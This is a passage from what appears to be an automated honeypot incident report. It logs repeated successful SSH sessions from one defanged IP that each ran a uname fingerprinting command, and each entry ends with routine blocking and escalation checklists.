| `2026-09-07 20:06:24` | `cowrie.login.success` |
| `2026-09-07 20:06:25` | `cowrie.session.params` |
| `2026-09-07 20:06:25` | `cowrie.command.input` |
| `2026-09-07 20:06:26` | `cowrie.log.closed` |
| `2026-09-07 20:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab34329064cc

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:06 |
| **Last Seen** | 2026-09-07 20:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:06:50` | `cowrie.session.connect` |
| `2026-09-07 20:06:51` | `cowrie.client.version` |
| `2026-09-07 20:06:51` | `cowrie.client.kex` |
| `2026-09-07 20:06:53` | `cowrie.login.success` |
| `2026-09-07 20:06:55` | `cowrie.session.params` |
| `2026-09-07 20:06:55` | `cowrie.command.input` |
| `2026-09-07 20:06:55` | `cowrie.log.closed` |
| `2026-09-07 20:06:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b096dbf3844e

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:07 |
| **Last Seen** | 2026-09-07 20:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:07:19` | `cowrie.session.connect` |
| `2026-09-07 20:07:20` | `cowrie.client.version` |
| `2026-09-07 20:07:20` | `cowrie.client.kex` |
| `2026-09-07 20:07:22` | `cowrie.login.success` |
| `2026-09-07 20:07:24` | `cowrie.session.params` |
| `2026-09-07 20:07:24` | `cowrie.command.input` |
| `2026-09-07 20:07:24` | `cowrie.log.closed` |
| `2026-09-07 20:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40e4dd542a73

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:07 |
| **Last Seen** | 2026-09-07 20:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:07:49` | `cowrie.session.connect` |
| `2026-09-07 20:07:49` | `cowrie.client.version` |
| `2026-09-07 20:07:49` | `cowrie.client.kex` |
| `2026-09-07 20:07:51` | `cowrie.login.success` |
| `2026-09-07 20:07:53` | `cowrie.session.params` |
| `2026-09-07 20:07:53` | `cowrie.command.input` |
| `2026-09-07 20:07:54` | `cowrie.log.closed` |
| `2026-09-07 20:07:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6961426609f

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:08 |
| **Last Seen** | 2026-09-07 20:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:08:18` | `cowrie.session.connect` |
| `2026-09-07 20:08:18` | `cowrie.client.version` |
| `2026-09-07 20:08:18` | `cowrie.client.kex` |
| `2026-09-07 20:08:20` | `cowrie.login.success` |
| `2026-09-07 20:08:22` | `cowrie.session.params` |
| `2026-09-07 20:08:22` | `cowrie.command.input` |
| `2026-09-07 20:08:23` | `cowrie.log.closed` |
| `2026-09-07 20:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3049b787dcc6

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:08 |
| **Last Seen** | 2026-09-07 20:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:08:47` | `cowrie.session.connect` |
| `2026-09-07 20:08:47` | `cowrie.client.version` |
| `2026-09-07 20:08:47` | `cowrie.client.kex` |
| `2026-09-07 20:08:50` | `cowrie.login.success` |
| `2026-09-07 20:08:51` | `cowrie.session.params` |
| `2026-09-07 20:08:51` | `cowrie.command.input` |
| `2026-09-07 20:08:52` | `cowrie.log.closed` |
| `2026-09-07 20:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70b46c9691df

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:09 |
| **Last Seen** | 2026-09-07 20:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:09:16` | `cowrie.session.connect` |
| `2026-09-07 20:09:17` | `cowrie.client.version` |
| `2026-09-07 20:09:17` | `cowrie.client.kex` |
| `2026-09-07 20:09:19` | `cowrie.login.success` |
| `2026-09-07 20:09:21` | `cowrie.session.params` |
| `2026-09-07 20:09:21` | `cowrie.command.input` |
| `2026-09-07 20:09:21` | `cowrie.log.closed` |
| `2026-09-07 20:09:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8548a3d1592

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:09 |
| **Last Seen** | 2026-09-07 20:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:09:45` | `cowrie.session.connect` |
| `2026-09-07 20:09:46` | `cowrie.client.version` |
| `2026-09-07 20:09:46` | `cowrie.client.kex` |
| `2026-09-07 20:09:48` | `cowrie.login.success` |
| `2026-09-07 20:09:50` | `cowrie.session.params` |
| `2026-09-07 20:09:50` | `cowrie.command.input` |
| `2026-09-07 20:09:51` | `cowrie.log.closed` |
| `2026-09-07 20:09:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120d19343fcb

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:10 |
| **Last Seen** | 2026-09-07 20:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:10:15` | `cowrie.session.connect` |
| `2026-09-07 20:10:15` | `cowrie.client.version` |
| `2026-09-07 20:10:15` | `cowrie.client.kex` |
| `2026-09-07 20:10:17` | `cowrie.login.success` |
| `2026-09-07 20:10:19` | `cowrie.session.params` |
| `2026-09-07 20:10:19` | `cowrie.command.input` |
| `2026-09-07 20:10:20` | `cowrie.log.closed` |
| `2026-09-07 20:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c377b6a2c160

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:10 |
| **Last Seen** | 2026-09-07 20:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:10:44` | `cowrie.session.connect` |
| `2026-09-07 20:10:44` | `cowrie.client.version` |
| `2026-09-07 20:10:44` | `cowrie.client.kex` |
| `2026-09-07 20:10:47` | `cowrie.login.success` |
| `2026-09-07 20:10:49` | `cowrie.session.params` |
| `2026-09-07 20:10:49` | `cowrie.command.input` |
| `2026-09-07 20:10:49` | `cowrie.log.closed` |
| `2026-09-07 20:10:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3e62129dccf

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:11 |
| **Last Seen** | 2026-09-07 20:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:11:13` | `cowrie.session.connect` |
| `2026-09-07 20:11:14` | `cowrie.client.version` |
| `2026-09-07 20:11:14` | `cowrie.client.kex` |
| `2026-09-07 20:11:16` | `cowrie.login.success` |
| `2026-09-07 20:11:17` | `cowrie.session.params` |
| `2026-09-07 20:11:17` | `cowrie.command.input` |
| `2026-09-07 20:11:18` | `cowrie.log.closed` |
| `2026-09-07 20:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8183c696006

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:12 |
| **Last Seen** | 2026-09-07 20:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:12:11` | `cowrie.session.connect` |
| `2026-09-07 20:12:12` | `cowrie.client.version` |
| `2026-09-07 20:12:12` | `cowrie.client.kex` |
| `2026-09-07 20:12:14` | `cowrie.login.success` |
| `2026-09-07 20:12:16` | `cowrie.session.params` |
| `2026-09-07 20:12:16` | `cowrie.command.input` |
| `2026-09-07 20:12:17` | `cowrie.log.closed` |
| `2026-09-07 20:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-045560cea5d7

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:12 |
| **Last Seen** | 2026-09-07 20:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:12:41` | `cowrie.session.connect` |
| `2026-09-07 20:12:41` | `cowrie.client.version` |
| `2026-09-07 20:12:41` | `cowrie.client.kex` |
| `2026-09-07 20:12:43` | `cowrie.login.success` |
| `2026-09-07 20:12:45` | `cowrie.session.params` |
| `2026-09-07 20:12:45` | `cowrie.command.input` |
| `2026-09-07 20:12:45` | `cowrie.log.closed` |
| `2026-09-07 20:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0358a558fb9

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:13 |
| **Last Seen** | 2026-09-07 20:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:13:10` | `cowrie.session.connect` |
| `2026-09-07 20:13:10` | `cowrie.client.version` |
| `2026-09-07 20:13:10` | `cowrie.client.kex` |
| `2026-09-07 20:13:13` | `cowrie.login.success` |
| `2026-09-07 20:13:14` | `cowrie.session.params` |
| `2026-09-07 20:13:14` | `cowrie.command.input` |
| `2026-09-07 20:13:15` | `cowrie.log.closed` |
| `2026-09-07 20:13:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8baa360c3d8

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:13 |
| **Last Seen** | 2026-09-07 20:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:13:39` | `cowrie.session.connect` |
| `2026-09-07 20:13:39` | `cowrie.client.version` |
| `2026-09-07 20:13:39` | `cowrie.client.kex` |
| `2026-09-07 20:13:42` | `cowrie.login.success` |
| `2026-09-07 20:13:44` | `cowrie.session.params` |
| `2026-09-07 20:13:44` | `cowrie.command.input` |
| `2026-09-07 20:13:44` | `cowrie.log.closed` |
| `2026-09-07 20:13:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a48c9c98709

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:14 |
| **Last Seen** | 2026-09-07 20:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:14:08` | `cowrie.session.connect` |
| `2026-09-07 20:14:09` | `cowrie.client.version` |
| `2026-09-07 20:14:09` | `cowrie.client.kex` |
| `2026-09-07 20:14:11` | `cowrie.login.success` |
| `2026-09-07 20:14:13` | `cowrie.session.params` |
| `2026-09-07 20:14:13` | `cowrie.command.input` |
| `2026-09-07 20:14:13` | `cowrie.log.closed` |
| `2026-09-07 20:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0df581142b17

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:14 |
| **Last Seen** | 2026-09-07 20:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:14:37` | `cowrie.session.connect` |
| `2026-09-07 20:14:38` | `cowrie.client.version` |
| `2026-09-07 20:14:38` | `cowrie.client.kex` |
| `2026-09-07 20:14:40` | `cowrie.login.success` |
| `2026-09-07 20:14:42` | `cowrie.session.params` |
| `2026-09-07 20:14:42` | `cowrie.command.input` |
| `2026-09-07 20:14:43` | `cowrie.log.closed` |
| `2026-09-07 20:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437831828cf7

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:15 |
| **Last Seen** | 2026-09-07 20:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:15:07` | `cowrie.session.connect` |
| `2026-09-07 20:15:07` | `cowrie.client.version` |
| `2026-09-07 20:15:07` | `cowrie.client.kex` |
| `2026-09-07 20:15:09` | `cowrie.login.success` |
| `2026-09-07 20:15:11` | `cowrie.session.params` |
| `2026-09-07 20:15:11` | `cowrie.command.input` |
| `2026-09-07 20:15:11` | `cowrie.log.closed` |
| `2026-09-07 20:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c921daabca

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:15 |
| **Last Seen** | 2026-09-07 20:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:15:36` | `cowrie.session.connect` |
| `2026-09-07 20:15:36` | `cowrie.client.version` |
| `2026-09-07 20:15:36` | `cowrie.client.kex` |
| `2026-09-07 20:15:38` | `cowrie.login.success` |
| `2026-09-07 20:15:40` | `cowrie.session.params` |
| `2026-09-07 20:15:40` | `cowrie.command.input` |
| `2026-09-07 20:15:41` | `cowrie.log.closed` |
| `2026-09-07 20:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76aff9cc7cdd

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:16 |
| **Last Seen** | 2026-09-07 20:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:16:05` | `cowrie.session.connect` |
| `2026-09-07 20:16:06` | `cowrie.client.version` |
| `2026-09-07 20:16:06` | `cowrie.client.kex` |
| `2026-09-07 20:16:08` | `cowrie.login.success` |
| `2026-09-07 20:16:09` | `cowrie.session.params` |
| `2026-09-07 20:16:09` | `cowrie.command.input` |
| `2026-09-07 20:16:10` | `cowrie.log.closed` |
| `2026-09-07 20:16:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-815e412de4ae

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:16 |
| **Last Seen** | 2026-09-07 20:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:16:34` | `cowrie.session.connect` |
| `2026-09-07 20:16:35` | `cowrie.client.version` |
| `2026-09-07 20:16:35` | `cowrie.client.kex` |
| `2026-09-07 20:16:37` | `cowrie.login.success` |
| `2026-09-07 20:16:39` | `cowrie.session.params` |
| `2026-09-07 20:16:39` | `cowrie.command.input` |
| `2026-09-07 20:16:39` | `cowrie.log.closed` |
| `2026-09-07 20:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ed742c51cd

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:17 |
| **Last Seen** | 2026-09-07 20:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:17:04` | `cowrie.session.connect` |
| `2026-09-07 20:17:04` | `cowrie.client.version` |
| `2026-09-07 20:17:04` | `cowrie.client.kex` |
| `2026-09-07 20:17:06` | `cowrie.login.success` |
| `2026-09-07 20:17:08` | `cowrie.session.params` |
| `2026-09-07 20:17:08` | `cowrie.command.input` |
| `2026-09-07 20:17:09` | `cowrie.log.closed` |
| `2026-09-07 20:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30a06bdc0aa

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:17 |
| **Last Seen** | 2026-09-07 20:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:17:33` | `cowrie.session.connect` |
| `2026-09-07 20:17:34` | `cowrie.client.version` |
| `2026-09-07 20:17:34` | `cowrie.client.kex` |
| `2026-09-07 20:17:36` | `cowrie.login.success` |
| `2026-09-07 20:17:37` | `cowrie.session.params` |
| `2026-09-07 20:17:37` | `cowrie.command.input` |
| `2026-09-07 20:17:38` | `cowrie.log.closed` |
| `2026-09-07 20:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722b038b3b9f

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:18 |
| **Last Seen** | 2026-09-07 20:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:18:02` | `cowrie.session.connect` |
| `2026-09-07 20:18:03` | `cowrie.client.version` |
| `2026-09-07 20:18:03` | `cowrie.client.kex` |
| `2026-09-07 20:18:05` | `cowrie.login.success` |
| `2026-09-07 20:18:06` | `cowrie.session.params` |
| `2026-09-07 20:18:06` | `cowrie.command.input` |
| `2026-09-07 20:18:06` | `cowrie.log.closed` |
| `2026-09-07 20:18:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b55384a1cce3

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:18 |
| **Last Seen** | 2026-09-07 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:18:29` | `cowrie.session.connect` |
| `2026-09-07 20:18:29` | `cowrie.client.version` |
| `2026-09-07 20:18:29` | `cowrie.client.kex` |
| `2026-09-07 20:18:30` | `cowrie.login.success` |
| `2026-09-07 20:18:30` | `cowrie.session.params` |
| `2026-09-07 20:18:30` | `cowrie.command.input` |
| `2026-09-07 20:18:30` | `cowrie.log.closed` |
| `2026-09-07 20:18:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0766a31dbd60

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 20:18 |
| **Last Seen** | 2026-09-07 20:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 20:18:55` | `cowrie.session.connect` |
| `2026-09-07 20:18:55` | `cowrie.client.version` |
| `2026-09-07 20:18:55` | `cowrie.client.kex` |
| `2026-09-07 20:18:55` | `cowrie.login.success` |
| `2026-09-07 20:18:56` | `cowrie.session.params` |
| `2026-09-07 20:18:56` | `cowrie.command.input` |
| `2026-09-07 20:18:56` | `cowrie.log.closed` |
| `2026-09-07 20:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

